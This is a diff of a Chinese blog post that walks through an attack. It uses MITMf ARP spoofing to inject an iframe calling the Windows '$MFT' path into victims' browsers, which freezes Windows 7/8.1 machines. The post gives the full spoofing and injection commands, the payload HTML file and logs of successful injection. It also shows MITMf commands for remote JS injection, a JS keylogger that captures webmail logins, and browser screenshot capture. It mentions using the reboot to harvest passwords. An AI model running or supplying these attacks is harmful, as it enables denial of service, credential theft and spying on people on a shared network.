@@ -75,7 +75,7 @@
 <meta name="keywords" content="$MFT漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过MITMf利用$MFT漏洞锁定局域网电脑">
-<meta property="og:url" content="http://www.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
 <meta property="og:description" content="由签名Alladin信息研究员Anatolymik（俄语）发现的bug 允许通过简单的文件调用来阻止Windows 7和8.1系统。 $ MFT，当我们访问例如C：\ $ MFT \ hello.txt时，NTFS文件系统（NTFS）在该资源中创建一个块并且不让它去。NT文件系统就会锁定整个C盘，由于C盘为系统盘，从而导致整个系统被锁定。 此漏洞可以在本地利用，也可以通过Internet Expl">
 <meta property="og:locale" content="zh-Hans">
@@ -85,7 +85,7 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/jdbx25zst1hh0d31zaw3dfn3r3.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/ertmxnbp4lz3eskmppdh3ga0v0.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/9psqsr093ki0mgwkzodsuengvt.png">
-<meta property="og:updated_time" content="2018-11-10T09:12:33.756Z">
+<meta property="og:updated_time" content="2020-02-26T10:42:49.668Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通过MITMf利用$MFT漏洞锁定局域网电脑">
 <meta name="twitter:description" content="由签名Alladin信息研究员Anatolymik（俄语）发现的bug 允许通过简单的文件调用来阻止Windows 7和8.1系统。 $ MFT，当我们访问例如C：\ $ MFT \ hello.txt时，NTFS文件系统（NTFS）在该资源中创建一个块并且不让它去。NT文件系统就会锁定整个C盘，由于C盘为系统盘，从而导致整个系统被锁定。 此漏洞可以在本地利用，也可以通过Internet Expl">
@@ -119,12 +119,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>通过MITMf利用$MFT漏洞锁定局域网电脑 | h1tler's blog</title>
   
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/03/12/通过MITMf利用$MFT漏洞锁定局域网电脑/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -364,23 +364,139 @@
 <blockquote>
 <p>root@kali:~# /etc/init.d/apache2 start<br>[ ok ] Starting apache2 (via systemctl): apache2.service.<br>root@kali:~#</p>
 </blockquote>
-<p>我们还需要一个包含对$ MFT的调用的html文件，以便我们可以将其注入到iframe中以供我们的受害者使用。<br>我们将把这个文件放在nice.html中，我们必须将它放在/ var / www / html中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:/var/www/html# ls</div><div class="line">index.html  nice.html</div><div class="line">root@kali:/var/www/html# cat nice.html </div><div class="line">&lt;html&gt;</div><div class="line">&lt;img src=&quot;c:\$MFT\123&quot; alt=&quot;Smiley face&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">root@kali:/var/www/html#</div></pre></td></tr></table></figure></p>
+<p>我们还需要一个包含对$ MFT的调用的html文件，以便我们可以将其注入到iframe中以供我们的受害者使用。<br>我们将把这个文件放在nice.html中，我们必须将它放在/ var / www / html中</p>
+<pre><code class="language-html">root@kali:/var/www/html# ls
+index.html  nice.html
+root@kali:/var/www/html# cat nice.html 
+&lt;html&gt;
+&lt;img src=&quot;c:\$MFT\123&quot; alt=&quot;Smiley face&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;
+&lt;/html&gt;
+root@kali:/var/www/html#
+</code></pre>
 <p>该html文件非常简单，但它完美地完成了任务。<br>有了这个，我们准备发起攻击。</p>
-<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2><p>我们必须做的第一件事是确认我们的服务器已启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@kali:/var/www/html# /etc/init.d/apache2 status</div><div class="line">● apache2.service - The Apache HTTP Server</div><div class="line">   Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)</div><div class="line">   Active: active (running) since Tue 2017-05-30 12:16:16 EDT; 5min ago</div><div class="line">  Process: 1104 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)</div><div class="line"> Main PID: 1115 (apache2)</div><div class="line">    Tasks: 7 (limit: 4915)</div><div class="line">   CGroup: /system.slice/apache2.service</div><div class="line">           ├─1115 /usr/sbin/apache2 -k start</div><div class="line">           ├─1133 /usr/sbin/apache2 -k start</div><div class="line">           ├─1134 /usr/sbin/apache2 -k start</div><div class="line">           ├─1135 /usr/sbin/apache2 -k start</div><div class="line">           ├─1136 /usr/sbin/apache2 -k start</div><div class="line">           ├─1137 /usr/sbin/apache2 -k start</div><div class="line">           └─1138 /usr/sbin/apache2 -k start</div><div class="line"> </div><div class="line">May 30 12:16:15 kali systemd[1]: Starting The Apache HTTP Server...</div><div class="line">May 30 12:16:16 kali apachectl[1104]: AH00558: apache2: Could not reliably determine the server&apos;s fully qualified domain name, using 127.0.1.1. Set the &apos;ServerName&apos; d…s this message</div><div class="line">May 30 12:16:16 kali systemd[1]: Started The Apache HTTP Server.</div><div class="line">Hint: Some lines were ellipsized, use -l to show in full.</div></pre></td></tr></table></figure></p>
-<p>一旦这部分被验证，我们可以启动MITMf来将这个html注入到我们的受害者中，命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/MITMf# python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http://192.168.1.111/nice.html</div></pre></td></tr></table></figure></p>
-<p>在这里，我们告诉MITMf做出欺骗网关192.168.1.254，我们受害者的机器是192.168.1.67，我们希望以注入HTML http:\//192.168.1.111/nice.html我们受害者的浏览器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http:\//192.168.1.111/nice.html</div></pre></td></tr></table></figure></p>
-<p>该命令的输出应与以下内容类似:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">root@kali:~/MITMf# python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http://192.168.1.111/nice.html</div><div class="line"> </div><div class="line">@@@@@@@@@@   @@@  @@@@@@@  @@@@@@@@@@   @@@@@@@@  </div><div class="line">@@@@@@@@@@@  @@@  @@@@@@@  @@@@@@@@@@@  @@@@@@@@  </div><div class="line">@@! @@! @@!  @@!    @@!    @@! @@! @@!  @@!       </div><div class="line">!@! !@! !@!  !@!    !@!    !@! !@! !@!  !@!       </div><div class="line">@!! !!@ @!@  !!@    @!!    @!! !!@ @!@  @!!!:!    </div><div class="line">!@!   ! !@!  !!!    !!!    !@!   ! !@!  !!!!!:    </div><div class="line">!!:     !!:  !!:    !!:    !!:     !!:  !!:       </div><div class="line">&lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;     &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;  &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;    &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;    &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;     &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;  &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;       </div><div class="line">:::     ::    ::     ::    :::     ::    ::       </div><div class="line"> :      :    :       :      :      :     :        </div><div class="line"> </div><div class="line">[*] MITMf v0.9.8 - &apos;The Dark Side&apos;</div><div class="line">|</div><div class="line">|_ Net-Creds v1.0 online</div><div class="line">|_ Inject v0.4</div><div class="line">|_ Spoof v0.6</div><div class="line">|  |_ ARP spoofing enabled</div><div class="line">|_ Sergio-Proxy v0.2.1 online</div><div class="line">|_ SSLstrip v0.9 by Moxie Marlinspike online</div><div class="line">|</div><div class="line">|_ MITMf-API online</div><div class="line">Error starting HTTP server: [Errno 98] Address already in use</div><div class="line"> * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)</div><div class="line">|_ HTTP server online</div><div class="line">|_ DNSChef v0.4 online</div><div class="line">|_ SMB server online</div></pre></td></tr></table></figure></p>
-<p>当我们的受害者访问任何页面时，MITMf会尝试将我们的html注入浏览器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">2017-05-30 12:27:07 192.168.1.67 [type:IE-8 os:Windows 7] www.bing.com</div><div class="line">2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] elpais.com.co</div><div class="line">2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: elpais.com.co</div><div class="line">2017-05-30 12:27:27 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] sso.elpais.com.co</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.googletagservices.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.google.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s7.addthis.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] code3.adtlgc.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] tag.navdmp.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] raw.githack.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] b.scorecardresearch.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s.clickiocdn.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s.clickiocdn.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] cdnjs.cloudflare.com</div><div class="line">2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] cdnjs.cloudflare.com</div><div class="line">2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] cdn.cxense.com</div><div class="line">2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] api.cxense.com</div><div class="line">2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] api.cxense.com</div><div class="line">2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] comcluster.cxense.com</div><div class="line">2017-05-30 12:27:33 192.168.1.67 [type:Other-Other os:Other] g.symcd.com</div><div class="line">2017-05-30 12:27:34 192.168.1.67 [type:Other-Other os:Other] clients1.google.com</div><div class="line">2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] www.gstatic.com</div><div class="line">2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] tpc.googlesyndication.com</div><div class="line">2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: tpc.googlesyndication.com</div><div class="line">2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:35 192.168.1.67 [type:IE-8 os:Windows 7] 192.168.1.111</div></pre></td></tr></table></figure></p>
-<p>我们可以看到Iframe被成功注入了好几次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: elpais.com.co</div><div class="line">2017-05-30 12:27:27 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co</div><div class="line">2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: www.elpais.com.co</div></pre></td></tr></table></figure></p>
+<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2><p>我们必须做的第一件事是确认我们的服务器已启动</p>
+<pre><code class="language-html">root@kali:/var/www/html# /etc/init.d/apache2 status
+● apache2.service - The Apache HTTP Server
+   Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
+   Active: active (running) since Tue 2017-05-30 12:16:16 EDT; 5min ago
+  Process: 1104 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+ Main PID: 1115 (apache2)
+    Tasks: 7 (limit: 4915)
+   CGroup: /system.slice/apache2.service
+           ├─1115 /usr/sbin/apache2 -k start
+           ├─1133 /usr/sbin/apache2 -k start
+           ├─1134 /usr/sbin/apache2 -k start
+           ├─1135 /usr/sbin/apache2 -k start
+           ├─1136 /usr/sbin/apache2 -k start
+           ├─1137 /usr/sbin/apache2 -k start
+           └─1138 /usr/sbin/apache2 -k start
+
+May 30 12:16:15 kali systemd[1]: Starting The Apache HTTP Server...
+May 30 12:16:16 kali apachectl[1104]: AH00558: apache2: Could not reliably determine the server&#39;s fully qualified domain name, using 127.0.1.1. Set the &#39;ServerName&#39; d…s this message
+May 30 12:16:16 kali systemd[1]: Started The Apache HTTP Server.
+Hint: Some lines were ellipsized, use -l to show in full.
+</code></pre>
+<p>一旦这部分被验证，我们可以启动MITMf来将这个html注入到我们的受害者中，命令如下</p>
+<pre><code class="language-html">root@kali:~/MITMf# python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http://192.168.1.111/nice.html
+</code></pre>
+<p>在这里，我们告诉MITMf做出欺骗网关192.168.1.254，我们受害者的机器是192.168.1.67，我们希望以注入HTML http:\//192.168.1.111/nice.html我们受害者的浏览器。</p>
+<pre><code class="language-html">python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http:\//192.168.1.111/nice.html
+</code></pre>
+<p>该命令的输出应与以下内容类似:</p>
+<pre><code class="language-html">root@kali:~/MITMf# python ./mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.254 --target 192.168.1.67 --inject --html-url http://192.168.1.111/nice.html
+
+@@@@@@@@@@   @@@  @@@@@@@  @@@@@@@@@@   @@@@@@@@  
+@@@@@@@@@@@  @@@  @@@@@@@  @@@@@@@@@@@  @@@@@@@@  
+@@! @@! @@!  @@!    @@!    @@! @@! @@!  @@!       
+!@! !@! !@!  !@!    !@!    !@! !@! !@!  !@!       
+@!! !!@ @!@  !!@    @!!    @!! !!@ @!@  @!!!:!    
+!@!   ! !@!  !!!    !!!    !@!   ! !@!  !!!!!:    
+!!:     !!:  !!:    !!:    !!:     !!:  !!:       
+&lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;     &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;  &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;    &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;    &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;     &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;  &lt;img draggable=&quot;false&quot; class=&quot;emoji&quot; alt=&quot;❗&quot; src=&quot;https://s.w.org/images/core/emoji/2.3/svg/2757.svg&quot; scale=&quot;0&quot;&gt;       
+:::     ::    ::     ::    :::     ::    ::       
+ :      :    :       :      :      :     :        
+
+[*] MITMf v0.9.8 - &#39;The Dark Side&#39;
+|
+|_ Net-Creds v1.0 online
+|_ Inject v0.4
+|_ Spoof v0.6
+|  |_ ARP spoofing enabled
+|_ Sergio-Proxy v0.2.1 online
+|_ SSLstrip v0.9 by Moxie Marlinspike online
+|
+|_ MITMf-API online
+Error starting HTTP server: [Errno 98] Address already in use
+ * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)
+|_ HTTP server online
+|_ DNSChef v0.4 online
+|_ SMB server online
+</code></pre>
+<p>当我们的受害者访问任何页面时，MITMf会尝试将我们的html注入浏览器。</p>
+<pre><code class="language-html">2017-05-30 12:27:07 192.168.1.67 [type:IE-8 os:Windows 7] www.bing.com
+2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] elpais.com.co
+2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: elpais.com.co
+2017-05-30 12:27:27 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] sso.elpais.com.co
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.googletagservices.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.google.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s7.addthis.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] code3.adtlgc.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] tag.navdmp.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] raw.githack.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] b.scorecardresearch.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s.clickiocdn.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] s.clickiocdn.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] cdnjs.cloudflare.com
+2017-05-30 12:27:29 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] cdnjs.cloudflare.com
+2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:31 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:32 192.168.1.67 [type:IE-8 os:Windows 7] cdn.cxense.com
+2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] api.cxense.com
+2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] api.cxense.com
+2017-05-30 12:27:33 192.168.1.67 [type:IE-8 os:Windows 7] comcluster.cxense.com
+2017-05-30 12:27:33 192.168.1.67 [type:Other-Other os:Other] g.symcd.com
+2017-05-30 12:27:34 192.168.1.67 [type:Other-Other os:Other] clients1.google.com
+2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] www.gstatic.com
+2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] tpc.googlesyndication.com
+2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: tpc.googlesyndication.com
+2017-05-30 12:27:34 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:35 192.168.1.67 [type:IE-8 os:Windows 7] 192.168.1.111
+</code></pre>
+<p>我们可以看到Iframe被成功注入了好几次</p>
+<pre><code class="language-html">2017-05-30 12:27:26 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: elpais.com.co
+2017-05-30 12:27:27 192.168.1.67 [type:IE-8 os:Windows 7] www.elpais.com.co
+2017-05-30 12:27:28 192.168.1.67 [type:IE-8 os:Windows 7] [Inject] Injected HTML Iframe: www.elpais.com.co
+</code></pre>
 <p>这告诉我们html注入成功了，所以我们的受害者必须在他的团队中感受到巨大的缓慢<br><img src="http://img.cdn.cuittk.cn/5cbw9573p3cy2ko6162ejg3jcq.png" alt=""><br>目前，我们的用户必须重新启动计算机，当它连接回共享资源时，我们可以使用它来捕获密码。</p>
 <h2 id="扩展学习："><a href="#扩展学习：" class="headerlink" title="扩展学习："></a>扩展学习：</h2><p>MITMF基本功能：cookies盗取，dns劫持，js注入…</p>
 <h3 id="MITMF工具实战测试"><a href="#MITMF工具实战测试" class="headerlink" title="MITMF工具实战测试"></a>MITMF工具实战测试</h3><p>环境：windows 7机器 ip地址：192.168.123.162  Kali Linux 机器 ip地址：192.168.123.6  默认网关ip: 192.168.123.1</p>
-<h4 id="Inject注入模块"><a href="#Inject注入模块" class="headerlink" title="Inject注入模块"></a>Inject注入模块</h4><p>可以向被欺骗者的浏览内容中注入各种猥琐的东西，比如js啦，html啦，图片啦，小电影啦<br>注入一个html(上文以及说了)<br>注入一个js：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --inject --js-url http://www.xxx.com/test.js</div></pre></td></tr></table></figure></p>
-<h4 id="JSKeylogger模块"><a href="#JSKeylogger模块" class="headerlink" title="JSKeylogger模块"></a>JSKeylogger模块</h4><p>一个键盘记录js,工具自带的keylogger的js:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --jskeylogger</div></pre></td></tr></table></figure></p>
+<h4 id="Inject注入模块"><a href="#Inject注入模块" class="headerlink" title="Inject注入模块"></a>Inject注入模块</h4><p>可以向被欺骗者的浏览内容中注入各种猥琐的东西，比如js啦，html啦，图片啦，小电影啦<br>注入一个html(上文以及说了)<br>注入一个js：</p>
+<pre><code class="language-html">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --inject --js-url http://www.xxx.com/test.js
+</code></pre>
+<h4 id="JSKeylogger模块"><a href="#JSKeylogger模块" class="headerlink" title="JSKeylogger模块"></a>JSKeylogger模块</h4><p>一个键盘记录js,工具自带的keylogger的js:</p>
+<pre><code class="language-html">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --jskeylogger
+</code></pre>
 <p>测试登录新浪邮箱（取消勾选全程加密）<br><img src="http://img.cdn.cuittk.cn/fgzrhguiay808tce5iea9zc0g4.png" alt=""><br><img src="http://img.cdn.cuittk.cn/jdbx25zst1hh0d31zaw3dfn3r3.png" alt=""></p>
-<h4 id="Screenshotter模块"><a href="#Screenshotter模块" class="headerlink" title="Screenshotter模块"></a>Screenshotter模块</h4><p>这个可以说是MITMf，甚至是在内网渗透工具中，最高级的功能之一了。支持对目标浏览器进行截屏。可以想象，攻击者将直接看到受害人的浏览截屏，隐私全无！这个插件是基于HTML5写的，默认截屏时间间隔是10s，使用–interval可以设置时间间隔。（不是很实用，保存的图片大多是网站框架图，具体看的什么获取的很慢）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --screen</div></pre></td></tr></table></figure></p>
